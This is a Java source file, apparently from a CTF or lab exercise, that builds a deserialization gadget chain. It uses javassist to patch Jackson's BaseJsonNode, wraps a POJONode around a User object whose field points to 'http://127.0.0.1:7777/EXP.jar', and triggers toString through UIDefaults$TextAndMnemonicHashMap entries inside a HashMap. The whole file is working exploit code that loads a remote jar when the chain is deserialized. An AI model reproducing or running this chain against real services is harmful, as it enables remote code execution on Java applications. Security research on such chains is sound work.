import com.example.ycbjava.bean.User;
import com.fasterxml.jackson.databind.node.POJONode;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import sun.misc.Unsafe;

import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class TextGadget {
    public static void main(String[] args) throws Exception {
        User user = new User();
        user.setGift("url:http://127.0.0.1:7777/EXP.jar");
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass0 = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass0.getDeclaredMethod("writeReplace");
        ctClass0.removeMethod(writeReplace);
        ctClass0.toClass();


        POJONode node = new POJONode((user));

        toStringClass toStringClass = new toStringClass();
        HashMap hashMap = makeHashMapByTextAndMnemonicHashMap(toStringClass);

        byte[] serialize = serialize(hashMap);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
        new ObjectInputStream(byteArrayInputStream).readObject();
    }

    public static HashMap makeHashMapByTextAndMnemonicHashMap(Object toStringClass) throws Exception{
        Map tHashMap1 = (Map) getObjectByUnsafe(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        Map tHashMap2 = (Map) getObjectByUnsafe(Class.forName("javax.swing.UIDefaults$TextAndMnemonicHashMap"));
        tHashMap1.put(toStringClass, "any1");
        tHashMap2.put(toStringClass, "any2");
        setFieldValue(tHashMap1, "loadFactor", 1);
        setFieldValue(tHashMap2, "loadFactor", 1);
        HashMap hashMap = new HashMap();
        hashMap.put(tHashMap1,"1");
        hashMap.put(tHashMap2,"1");

        tHashMap1.put(toStringClass, null);
        tHashMap2.put(toStringClass, null);
        return hashMap;
    }

    public static byte[] serialize(Object o) throws NoSuchFieldException, IllegalAccessException, IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(o);
        oos.close();
        return byteArrayOutputStream.toByteArray();
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
        Class<?> aClass = obj.getClass();
        Field field = null;
        while (aClass != null){
            try{
                field = aClass.getDeclaredField(fieldName);
                break;
            }catch(NoSuchFieldException e){
                aClass = aClass.getSuperclass();
            }
        }
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static Object getFieldValue(Object obj, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Class<?> aClass = obj.getClass();

        while (aClass != null){
            try{
                Field declaredField = aClass.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(obj);
            }catch(NoSuchFieldException e){
                aClass = aClass.getSuperclass();
            }
        }

        return null;
    }

    public static Object getObjectByUnsafe(Class clazz) throws Exception{
        Field theUnsafe = Unsafe.class.getDeclaredField("theUnsafe");
        theUnsafe.setAccessible(true);
        Unsafe unsafe = (Unsafe) theUnsafe.get(null);
        return unsafe.allocateInstance(clazz);
    }
}
